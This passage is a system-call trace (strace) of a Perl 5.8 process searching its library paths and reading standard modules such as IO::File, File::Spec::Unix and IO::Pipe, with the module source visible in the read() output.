5352  07:08:43.617861 stat64("/etc/perl/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617876 stat64("/etc/perl/IO/File.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617890 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617902 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617916 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617929 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617942 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617954 stat64("/usr/lib/perl5/IO/File.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617966 stat64("/usr/share/perl5/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.617978 stat64("/usr/share/perl5/IO/File.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618005 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618045 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
5352  07:08:43.618082 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.618096 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.618107 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.618125 read(10, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
5352  07:08:43.618367 stat64("/etc/perl/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618383 stat64("/etc/perl/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618396 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618408 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618422 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618434 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618448 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618459 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618472 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618494 stat64("/usr/share/perl5/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618511 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618544 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.618572 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.618585 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
5352  07:08:43.618605 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.618620 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.618631 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.618649 read(11, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
5352  07:08:43.618723 stat64("/etc/perl/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618736 stat64("/etc/perl/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618749 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618761 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618774 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618786 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618800 stat64("/usr/lib/perl5/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618812 stat64("/usr/lib/perl5/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618824 stat64("/usr/share/perl5/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618836 stat64("/usr/share/perl5/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618848 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618864 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618877 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.618889 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
5352  07:08:43.618909 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 12
5352  07:08:43.618922 ioctl(12, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2e648) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.618933 _llseek(12, 0, [0], SEEK_CUR) = 0
5352  07:08:43.618949 read(12, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
5352  07:08:43.619115 stat64("/etc/perl/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619130 stat64("/etc/perl/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619143 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619156 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619170 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619183 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619197 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619209 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619222 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619235 stat64("/usr/share/perl5/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619248 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619261 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfd2e38c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619274 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfd2e47c) = -1 ENOENT (No such file or directory)
5352  07:08:43.619287 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
5352  07:08:43.619308 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 13
5352  07:08:43.619323 ioctl(13, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2e198) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.619334 _llseek(13, 0, [0], SEEK_CUR) = 0
5352  07:08:43.619352 read(13, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
5352  07:08:43.619544 read(13, "", 4096) = 0
5352  07:08:43.619590 close(13)         = 0
5352  07:08:43.619782 _llseek(12, 1148, [1148], SEEK_SET) = 0
5352  07:08:43.619798 _llseek(12, 0, [1148], SEEK_CUR) = 0
5352  07:08:43.619808 close(12)         = 0
5352  07:08:43.619876 _llseek(11, 594, [594], SEEK_SET) = 0
5352  07:08:43.619890 _llseek(11, 0, [594], SEEK_CUR) = 0
5352  07:08:43.619900 close(11)         = 0
5352  07:08:43.619933 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.619948 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.619961 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.619974 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.620004 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.620044 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.620075 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.620087 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.620100 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.620112 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.620126 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.620138 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.620152 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.620164 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
5352  07:08:43.620186 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.620201 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.620212 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.620230 read(11, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
5352  07:08:43.620882 brk(0x8218000)    = 0x8218000
5352  07:08:43.621083 read(11, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
5352  07:08:43.621453 read(11, "", 4096) = 0
5352  07:08:43.621467 close(11)         = 0
5352  07:08:43.621730 read(10, "", 4096) = 0
5352  07:08:43.621745 close(10)         = 0
5352  07:08:43.621909 stat64("/etc/perl/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.621925 stat64("/etc/perl/IO/Pipe.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.621939 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.621952 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.621966 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622071 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622112 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622141 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622170 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622182 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622195 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.622207 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
5352  07:08:43.622228 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.622249 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.622260 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.622281 read(10, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined 